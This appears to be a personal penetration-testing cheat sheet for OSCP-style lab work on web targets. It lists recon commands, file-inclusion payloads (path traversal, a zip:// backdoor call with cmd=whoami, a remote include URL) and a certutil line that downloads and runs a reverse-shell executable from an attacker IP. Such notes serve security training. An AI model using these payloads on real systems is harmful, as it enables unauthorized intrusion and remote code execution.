- [Checklist](#checklist)
- [Default Webroot](#default-webroot)
- [Local File Inclusion](#local-file-inclusion)
- [Remote File Inclusion](#remote-file-inclusion)
- [Curl](#curl)
- [View Source Code](#view-source-code)
- [Gobuster](#gobuster)
- [Feroxbuster](#feroxbuster)
- [File Upload Vulnerability](#file-upload-vulnerability)
- [Java Code Execution](#java-code-execution)

# Checklist
- [ ] NMAP scripts
  -  nmap -sV --script=http-enum -oA nibbles_nmap_http_enum 10.129.42.190
- [ ] curl -IL https://www.inlanefreight.com
- [ ] whatweb 10.10.10.121
- [ ] View Source Code
- [ ] Gobuster
  - admin portal?
  - file upload vuln?
  - plugin page?
- [ ] wfuzz
- [ ] Check README
- [ ] Did we run exiftool against anything found?
- [ ] DNS enumeration
- [ ] Authentication: cewl -d 2 -m 4 http://10.129.200.170/nibbleblog/
- [ ] File upload vulnerability
- [ ] Discover webroot
- [ ] Robots.txt
- [ ] Local File Inclusion
- [ ] Remote File Inclusion
- [ ] SQLi
  - Try injecting a single quote(')
  - Try injecting %27



# Default Webroot
```bash
Apache	/var/www/html/
Nginx	/usr/local/nginx/html/
IIS	c:\inetpub\wwwroot\
XAMPP	C:\xampp\htdocs\
```


# Local File Inclusion
- Click stuff to find out if we can find this ?file=, ?page=
- We could also utilize zip://, file:// php://
  - ?file=zip://uploads/upload_xkxkxk.zip%23simple-backdoor&cmd=whoami

![image](https://github.com/nuricheun/OSCP/assets/14031269/c80aca68-e70d-42e5-a1ca-dd124e75324f)

**Windows**
- ?page=C:/Windows/System32/drivers/etc/hosts
- ?page=../../../../../../../../Windows/System32/drivers/etc/hosts
- ?file=zip://uploads/upload_xkxkxk.zip%23simple-backdoor&cmd=whoami

**Linux**


# Remote File Inclusion
- ?page=http://192.168.45.208/somefile.php


# Curl 
- When there are URLs pointing at something suspicious, change method (from GET to POST) with curl can give you clear answers
```bash
curl -X POST -d '{"user":"clumsyadmin", "url":"http://192.168.45.175:443/list-running-procs"}' http://192.168.163.99:33333/list-running-procs
```


# File Upload Vulnerability
```bash
# always check root after uploading something
http://example.com/uploadedsomething.txt
http://example.com/upload/uploadedsomething.txt
http://example.com/uploads/uploadedsomething.txt


```


# Java Code Execution (C:/Windows/Temp/)
```bash
certutil -urlcache -f http://192.168.45.176/rev80.exe C:/Windows/Temp/rev80.exe
C:/Windows/Temp/rev80.exe
```
